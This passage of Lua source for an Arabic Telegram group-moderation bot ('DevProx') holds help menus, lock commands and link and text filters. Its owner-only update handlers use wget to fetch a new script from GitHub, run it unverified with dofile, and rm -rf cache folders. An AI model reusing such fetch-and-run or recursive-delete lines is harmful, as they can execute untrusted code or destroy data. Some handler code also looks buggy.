#ملاحظه : تعمل جميع الاوامر ـبـ  ⇣
🔘 قـفـل + الامـر
☑️ فـتـح + الامـر
✵•┈••●◆💈◆●••┈•✵
📍 •» الـروابـط || لمنع ارسال الروابط 
🚩 •» الـمـعـرف || لمنع المعرفات (@)
📍 •» الـبـوتـات || لمنع اضافه البوتات
🚩 •» الـشـارحـه || لمنع الشارحه 
📍 •» الـمـتـحـركـه || لمنع ال (gif) 
🚩 •» الـمـلـفـات || لمنع ارسال الملف
📍 •» الـفـيـديـو || لمنع ارسال الفيديو
🚩 •» الاونـلايـن || لمنع الاونلاين
📍 •» الـدردشـه || لمنع التكلم 
🚩 •» الـتـوجـيـه || لمنع اعاده التوجيه
📍 •» الاغـانـي || لمنع ارسال الاغاني
🚩 •» الـصـوت || لمنع الصوتيات 
📍 •» الجـهـات || لمنع جهات الاتصال
🚩 •» الـماركداون || لمنع الماركداون
📍 •» الـعـربـيـه || لمنع الغه العربيه
🚩 •» الانـكـيزيه || لمنع الغه الانكليزيه
📍 •» الـحـمـايـه || لتفعيل الحمايه
🚩 •» الـتـكـرار || لمنع التكرار
📍 •» الـهاشتاك || لمنع الهاشتاك
🚩 •» الـتـعـديـل || لمنع التعديل
📍 •» الـتـثبيت || لألغاء تفعيل التثبيت
🚩 •» الاشعارات || لقفل الاشعارات
📍 •» الــكـل || لمنع جميع الاوامر
🚩 •» الـكـلايـش || لقفل الكلايش 
📍 •» الـشبكات || لمنع الشبكات
🚩 •» الـمـواقـع || لمنع الموااقع 
📍 •» الـفـشـار || لمنع السب والشتيمه
🚩 •» الـكـفـر || لمنع الكفر في الرب
📍 •» الـطـائفيه || لمنع الطائفيه
🚩 •» البوتات بالطرد || للقفل او الفتح
📍 •» البوتات بالتقييد || للقفل او الفتح
🚩 •» الكل بالساعات + عدد الساعات
✵•┈••●◆💈◆●••┈•✵
- DEV - @IQ_ABS   📌
- Channel - @DEV_PROX
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, (help or text), 1, 'md')
end
--     Source DevProx     --
if is_leader(msg) and text:match("^تعيين امر م2$") then
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ ارسل لي الكليشه الان " ,  1, "md")
DevAbs:set(DevProx..'bot:help21'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local DevProx =  DevAbs:get(DevProx..'bot:help21'..msg.sender_user_id_..'')
if DevProx == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ تم حفظ الكليشه الجديده " ,  1, "md")
DevAbs:set(DevProx..'bot:help21'..msg.sender_user_id_..'', 'no')
DevAbs:set(DevProx..'bot:help2', text)
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
--     Source DevProx     --
if text:match("^م2$") or text:match("^م٢$") then
local help = DevAbs:get(DevProx..'bot:help2')
local text =  [[
  SOURCE DevProx 𝆺𝅥𝅯
  ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯
   📥*┇* رفع بكل الصلاحيات
   📥*┇* الغاء خاصيه تغيير الاسم
   📥*┇* الغاء خاصيه التثبيت
   📥*┇* رفع « » تنزيل ادمن بالكروب
   📥*┇* رفع « » تنزيل ادمن {بلرد - بلايدي - بليوزر}
   📥*┇* رفع « » تنزيل مميز {بلرد - بلايدي - بليوزر}
  ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯
  
   📛*┇* اوامر الحذف والحظر والتقيد
  ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯
   📛*┇* طرد « » {بلرد - بلايدي - بليوزر}
   📛*┇* حذف الكل « » {بلرد - بلايدي - بليوزر}
   📛*┇* حظر « » الغاء حظر« » {بلرد - بلايدي - بليوزر}
   📛*┇* كتم  « » الغاء كتم « » {بلرد - بلايدي - بليوزر}
   📛*┇* تقييد « » الغاء التقييد« » {بلرد - بلايدي - بليوزر}
  ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯
  
   📨*┇* اوامر اخرى
  ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯
   ♻️*┇* فحص  
   💬*┇* اضف رد 
   🗑*┇* حذف رد 
   🧺*┇* اضف امر 
   🗑*┇* حذف امر 
   🧼*┇* اضف صلاحيه 
   🗑*┇* حذف صلاحيه 
  
   🎮*┇* تفعيل اللعبه 
   🗑*┇* حذف الردود 
   🗑*┇* حذف الرابط 
   📜*┇* جلب الترحيب 
   🗑*┇* حذف الترحيب 
   📥*┇* رفع المشرفين 
   🚸*┇* معلومات المجموعه 
   🛢*┇* تفعيل الحمايه القصوى  
   🗓*┇* طرد الحسابات المحذوفه 
   🗑*┇* تنظيف قائمه الحظر 
   🚫*┇* منع « » الغاء منع 
   🔊*┇* تثبيت « » الغاء التثبيت 
   🌟*┇* تفعيل « » تعطيل الايدي 
   🛎*┇* تفعيل « » تعطيل الحظر 
   🛎*┇* تفعيل « » تعطيل الطرد
   🛎*┇* تفعيل « » تعطيل الرابط
   🛎*┇* تفعيل « » تعطيل اطردني 
   🛎*┇* تفعيل « » تعطيل جلب الصوره 
   🛎*┇* تفعيل « » تعطيل ردود البوت 
   🦠*┇* كلهم   + الكليشه
   🗑*┇* حذف   + العدد 
   💬*┇* ايدي   + المعرف 
   ⏱*┇* اضافه + معرف العضو 
   📨*┇* اضف رسائل  + الايدي 
  ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯
  
  🚸*┇* قوائم اخرى
  
  🛋*┇* الصلاحيات « » الاوامر المضافه
  🏆*┇* الدعم « » قائمه المنع 
  💬*┇* الردود « » المحظورين 
  🥇*┇* المدراء « » الاعدادات 
  🥉*┇* الادمنيه « » المكتومين 
  🏆*┇* المقيدين « » الاعضاء المميزين 
  🔱*┇* المطايه « »   المميزين عام 
  🎖*┇* المنشئين « » المدراء العامين 
  🛋*┇* الصلاحيات « » الاوامر المضافه
  🥉*┇* الادمنيه العامين 
  ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯
🔊*┇* قناة السورس [@DEV_PROX]
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, (help or text), 1, 'md')
end
--     Source DevProx     --
if is_leader(msg) and text:match("^تعيين امر م3$") then
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ ارسل لي الكليشه الان " ,  1, "md")
DevAbs:set(DevProx..'bot:help31'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local DevProx =  DevAbs:get(DevProx..'bot:help31'..msg.sender_user_id_..'')
if DevProx == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ تم حفظ الكليشه الجديده " ,  1, "md")
DevAbs:set(DevProx..'bot:help31'..msg.sender_user_id_..'', 'no')
DevAbs:set(DevProx..'bot:help3', text)
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
--     Source DevProx     --
if text:match("^م3$") or text:match("^م٣$") then
local help = DevAbs:get(DevProx..'bot:help3')
local text =  [[
  SOURCE DevProx 𝆺𝅥𝅯
  ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯
  📤*┇*  اوامر الخدمة 
  ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯
    ⏱*┇* الوقت 
    💬*┇* زخرفه  
    ♻️*┇* الرابط 
    🚸*┇* موقعي 
    ☎️*┇* جهاتي 
    💎*┇* نقاطي 
    📛*┇* اطردني 
    🔱*┇* صورتي 
    📨*┇* رسائلي 
    🏆*┇* ايديي 
    📂*┇* معرفي 
    🔊*┇* اسمي 
    📜*┇* ايدي 
    🎮*┇* الالعاب 
    🌟*┇* سمايلات 
    🀄️*┇* ترتيب 
    ⁉️*┇* حزوره 
    🛎*┇* العكس 
    👊🏻*┇* المحيبس 
    💰*┇* امثله 
    🎁*┇* المختلف 
    📚*┇* معلوماتي 
    📖*┇* القوانين 
    ⚠️*┇* السورس 
    👁‍🗨*┇* المطور 
    🔔*┇* تاك للكل 
    💵*┇* بيع نقاطي 
    📧*┇* حذف رسائلي 
    ⏳*┇* ايدي بالرد 
    ⏳*┇* الرتبه بالرد 
    ⏳*┇* هينه بالرد  
    ⏳*┇* بوسه بالرد 
    ⏳*┇* بوسها بالرد 
    📛*┇* رابط الحذف 
    📨*┇* رسائلي اليوم 
    ☎️*┇* مشاهده المنشور 
    🏷*┇* ايدي المجموعه 
    📤*┇* اسم المجموعه 
    📥*┇* رفع « » تنزيل مطي 
  ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯
  ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯
    ⏰*┇* رتبته + المعرف 
    ⏰*┇* كول + الكلمه 
    ⏰*┇* هينه + المعرف 
    ⏰*┇* صورتي  + الرقم 
    ⏰*┇* الحساب + الايدي 
    ⏰*┇* طقس + اسم المدينه 
  ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯
🔊┇ قناة السورس [@DEV_PROX]
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, (help or text), 1, 'md')
end
--     Source DevProx     --
if is_leader(msg) and text:match("^تعيين امر م4$") then
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ ارسل لي الكليشه الان " ,  1, "md")
DevAbs:set(DevProx..'bot:help41'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local DevProx =  DevAbs:get(DevProx..'bot:help41'..msg.sender_user_id_..'')
if DevProx == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ تم حفظ الكليشه الجديده " ,  1, "md")
DevAbs:set(DevProx..'bot:help41'..msg.sender_user_id_..'', 'no')
DevAbs:set(DevProx..'bot:help4', text)
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
--     Source DevProx     --
if text:match("^م٤$") or text:match("^م4$") then
local help = DevAbs:get(DevProx..'bot:help4')
local text =  [[
  SOURCE DevProx 𝆺𝅥𝅯
  ➖➖➖➖➖➖➖
  🛎*┇* اوامر الوضع
  ➖➖➖➖➖➖➖➖
  🏆*┇* تعيين الايدي  )  لتغير الايدي الافتراضي
  🗑*┇* حذف الايدي  )  لسترجاع الايدي الافتراضي
  ➖➖➖➖➖➖➖➖
  ➖➖➖➖➖➖➖➖
  💬*┇* ضع + احد الاوامر ادناه 
  ➖➖➖➖➖➖➖➖
  ♻️*┇* رابط
  📜*┇*  قوانين  
  📥*┇* صوره  
  🚸*┇* ترحيب 
  📛*┇* تكرار + العدد 
  🗑*┇* عدد الاحرف + العدد 
  ⚠️*┇* اسم المجموعه + الاسم 
  🔔*┇* التكرار + بالطرد 
  📨*┇* التكرار + بالحذف 
  📥*┇* الايدي + بالصوره 
  🌟*┇* الايدي + بدون صوره 
  ➖➖➖➖➖➖➖➖ 
  🗑*┇* اوامر الحذف
  ➖➖➖➖➖➖➖➖ 
  ➖➖➖➖➖➖➖➖
  🗑*┇* حذف القوائم 
  🗑*┇* المحظورين « » البوتات 
  🗑*┇* المكتومين  « » الادمنيه 
  🗑*┇* المقيدين « » الاعضاء المميزين 
  🗑*┇* قائمه المنع « » قائمه المنع العام 
  ➖➖➖➖➖➖➖➖
🔊┇ قناة السورس [@DEV_PROX]
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, (help or text), 1, 'md')
end
--     Source DevProx     --
if is_leader(msg) and text:match("^تعيين امر م5$") then
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ ارسل لي الكليشه الان " ,  1, "md")
DevAbs:set(DevProx..'bot:help51'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local DevProx =  DevAbs:get(DevProx..'bot:help51'..msg.sender_user_id_..'')
if DevProx == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ تم حفظ الكليشه الجديده " ,  1, "md")
DevAbs:set(DevProx..'bot:help51'..msg.sender_user_id_..'', 'no')
DevAbs:set(DevProx..'bot:help5', text)
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end

if text:match("^م٥$") or text:match("^م5$") then
local help = DevAbs:get(DevProx..'bot:help5')
local text =  [[
  SOURCE DevProx 𝆺𝅥𝅯
  ➖➖➖➖➖➖➖
  📤*┇* اوامر المطورين
  ➖➖➖➖➖➖➖
  
    🔊*┇* تفعيل 
    🔇*┇* تعطيل 
    📥*┇* السيرفر 
    🏷*┇* الكروبات 
    📤*┇* المجموعات 
    ☎️*┇* الاحصائيات 
    ♻️*┇* تحديث 
    ⚠️*┇* اسم البوت + غادر 
    ♻️*┇* تحديث السورس 
    🏆*┇* توجيه للكل  
    🧫*┇* جلب نسخه الملف
  
    ✅*┇* استعاده الاوامر 
    📤*┇* تعيين الاوامر 
    📤*┇* تعيين امر م1 
    📤*┇* تعيين امر م2 
    📤*┇* تعيين امر م3 --
    📤*┇* تعيين امر م4 
    📤*┇* تعيين امر م5 
  
    🛢*┇* اضف رد للكل 
    🗑*┇* حذف رد للكل   
  
    ⛔️*┇* حظر عام 
    ✅*┇* الغاء العام 
    🚸*┇* ضع دعم 
    🗑*┇* حذف الدعم 
    📩*┇* جلب الملاحظه 
    🗑*┇* تنظيف الرسائل 
    🗑*┇* تنظيف الكروبات 
    🛎*┇* جلب رد الخاص 
    🗑*┇* حذف رد الخاص 
    🛢*┇* ردود المطور 
    📜*┇* قائمه العام 
    🚫*┇* قائمه المنع العام 
    ⚜️*┇* مطورين الرتبه الثالثه 
  
    🗂*┇* رفع النسخه ( بالرد للملف ) 
    🗂*┇* جلب نسخه الكروبات 
  
    📰*┇* (وضع او تغيير) اسم البوت 
    🗑*┇* حذف اسم البوت 
  
    🏆*┇* تفعيل كل الكروبات 
    🏆*┇* تعطيل كل الكروبات 
  
    📟*┇* تفعيل البوت الخدمي 
    ⏱*┇* تعطيل البوت الخدمي 
  
    🏆*┇* رفع « » تنزيل مدير 
    🏆*┇* رفع « » تنزيل منشئ 
    🏆*┇* رفع « » تنزيل مدير عام 
     🏆*┇* رفع « » تنزيل ادمن عام  
    🏆*┇* رفع « » تنزيل مميز عام 
    🏆*┇* رفع « » تنزيل مطور رتبه ثالثه 
  
    🎤*┇* رد الخاص تفعيل « » تعطيل 
    🗃*┇* المغادره التلقائيه تفعيل « » تعطيل 
  
    🔊*┇* قناة الاشتراك 
    ⏰*┇* تعيين « » تغيير قناة الاشتراك 
    🔕*┇* تفعيل « » تعطيل الاشتراك الاجباري 
    
    🗑*┇* حذف المدراء 
    🗑*┇* حذف المنشئين 
    🗑*┇* حذف  قائمه العام 
    🗑*┇* حذف ردود المطور 
    🗑*┇* حذف المميزين عام 
    🗑*┇* حذف المدراء العامين 
    🗑*┇* حذف الادمنيه العامين 
    🗑*┇* حذف قائمه المنع العام 
    🗑*┇* حذف مطورين الرتبه الثالثه 
  
    🏆*┇* كشف  + ايدي الكروب 
    🚸*┇* اذاعه  + المنشور 
    📤*┇* فلتر عام  + الكلمه 
    ⏰*┇* الغاء فلتر عام   + الكليشه 
    📨*┇* ضع ملاحظه  + الملاحظه 
    🛎*┇* نشر بالخاص   + المنشور 
    ⚠️*┇* ضع رد الخاص  + الكليشه 
    ✅*┇* ضع كليشه المطور + الكليشه 
  
  ➖➖➖➖➖➖➖
🔊┇ قناة السورس [@DEV_PROX]
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, (help or text), 1, 'md')
end
--     Source DevProx     --
if text == "تحديث السورس" and is_leader(msg) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ جاري تحديث السورس الى الاصدار الجديد ', 1, 'md') 
os.execute('rm -rf DevProx.lua') 
os.execute('wget https://raw.githubusercontent.com/iq0abs/DevProx/master/DevProx.lua') 
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم تحديث السورس اكتشف المميزات الجديده الان ', 1, 'md') 
dofile('DevProx.lua') 
io.popen("rm -rf ~/.telegram-cli/data/audio/*")
io.popen("rm -rf ~/.telegram-cli/data/document/*")
io.popen("rm -rf ~/.telegram-cli/data/photo/*")
io.popen("rm -rf ~/.telegram-cli/data/sticker/*")
io.popen("rm -rf ~/.telegram-cli/data/temp/*")
io.popen("rm -rf ~/.telegram-cli/data/thumb/*") 
io.popen("rm -rf ~/.telegram-cli/data/video/*")
io.popen("rm -rf ~/.telegram-cli/data/voice/*")
io.popen("rm -rf ~/.telegram-cli/data/profile_photo/*") 
end 
if text == 'تحديث' and is_leader(msg) then  
dofile('DevProx.lua')  io.popen("rm -rf ~/.telegram-cli/data/audio/*") 
io.popen("rm -rf ~/.telegram-cli/data/document/*") 
io.popen("rm -rf ~/.telegram-cli/data/photo/*") 
io.popen("rm -rf ~/.telegram-cli/data/sticker/*") 
io.popen("rm -rf ~/.telegram-cli/data/temp/*") 
io.popen("rm -rf ~/.telegram-cli/data/thumb/*") 
io.popen("rm -rf ~/.telegram-cli/data/video/*") 
io.popen("rm -rf ~/.telegram-cli/data/voice/*") 
io.popen("rm -rf ~/.telegram-cli/data/profile_photo/*") 
print("\27[31;47m\n          🚸) تم تحديث البوت (🚸          \n\27[0;34;49m\n") 
Dev_Abs(msg.chat_id_, msg.id_, 1, "🏆┇ تم تحديث البوت ", 1, "md")
end 

if text and text:match("^اضف رسائل (%d+)$") and is_monsh(msg.sender_user_id_, msg.chat_id_) then  
DevProx0 = text:match("^اضف رسائل (%d+)$")
DevAbs:set('DevProx:'..bot_id..'id:user'..msg.chat_id_,DevProx0)  
DevAbs:setex('DevProx:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  
Dev_Abs(msg.chat_id_, msg.id_, 1, "🏆┇ ارسل عدد الرسائل ", 1, "md")
Dev_Abs(msg.chat_id_, msg.id_, 1,Anwar, 1, 'md') 
end 
--     Source DevProx     --
if is_leader(msg) then
local text = msg.content_.text_:gsub("[Ss]etprice", "Setnerkh")
if text:match("^[Ss]etnerkh$") or text:match("^ضع كليشه المطور$") then
if DevAbs:get(DevProx.."lang:gp:" .. msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "🏆┇ Plese Send your now ", 1, "md")
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "🏆┇ ارسل لي كليشه المطور الان ", 1, "md")
end
DevAbs:setex(DevProx.."bot:nerkh" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 100, true)
end end
--     Source DevProx     --
if text:match("^قرنابيط$") then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ قنوات السورس \n\n [@DEV_PROX] \n\n [@DEV_PROX] \n ['..os.date("%H:%M:%S")..']', 1, 'md')    
end end

if tonumber(msg.sender_user_id_) == tonumber(bot_owner) then 
if (msg.content_.text_ == 'stats server' or msg.content_.text_ == 'السيرفر') then 
local DevProx = '*مضى على تشغيل السيرفر*\n\n' 
  local DevAbs1 = DevAbs:info()
  DevProx = DevProx..'*'..DevAbs1.server.uptime_in_days..' يوم \n'..DevAbs1.server.uptime_in_seconds..' ثانيه*\n'
  Dev_Abs(msg.chat_id_, msg.id_, 1, DevProx, 1, 'md')
end
end
--     Source DevProx     --
if is_owner(msg.sender_user_id_, msg.chat_id_) and not DevProx11(msg) or is_monsh(msg.sender_user_id_, msg.chat_id_) and not DevProx11(msg) or is_sudo(msg) and not DevProx11(msg) or is_leader(msg) and not DevProx11(msg) or is_admin(msg.sender_user_id_) and not DevProx11(msg) or is_momod(msg.sender_user_id_, msg.chat_id_) and not DevProx11(msg) or is_VipGroup(msg.sender_user_id_, msg.chat_id_) and not DevProx11(msg)  then
return false
end
end

if (data.ID == "UpdateChat") then
chat = data.chat_
chats[chat.id_] = chat
end
if (data.ID == "UpdateMessageEdited") then
local msg = data
function get_msg_contact(extra, result, success)
local text = (result.content_.text_ or result.content_.caption_)
if result.id_ and result.content_.text_ then
DevAbs:set(DevProx..'bot:editid'..result.id_,result.content_.text_)
end 
end
if not is_VipGroup(result.sender_user_id_, result.chat_id_) then
check_filter_words(result, text)
if DevAbs:get(DevProx..'editmsg'..msg.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end

if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") then
if DevAbs:get(DevProx..'bot:links:mute'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end

if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") or text:match("/") then
if DevAbs:get(DevProx..'bot:webpage:mute'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end

if text:match("@") then
if DevAbs:get(DevProx..'tags:lock'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end

if text:match("#") then 
if DevAbs:get(DevProx..'bot:abstag:mute'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end

if text:match("[\216-\219][\128-\191]") then
if DevAbs:get(DevProx..'bot:arabic:mute'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end

if text:match("[A-Z]") or text:match("[a-z]") then
if DevAbs:get(DevProx..'bot:english:mute'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end end end

getMessage(msg.chat_id_, msg.message_id_,get_msg_contact)
if (data.ID == "UpdateOption" and data.name_ == "my_id") then
tdcli_function ({ID="GetChats", offset_order_="9223372036854775807", offset_chat_id_=0, limit_=20}, dl_cb, nil)
end
 ----------------------------------------------
 -- This Source Was Developed By (ABS) @IQ_ABS.
 -- This Is The Source Channel @Dev_Prox .
 --                - DevProx -
 ----------------------------------------------
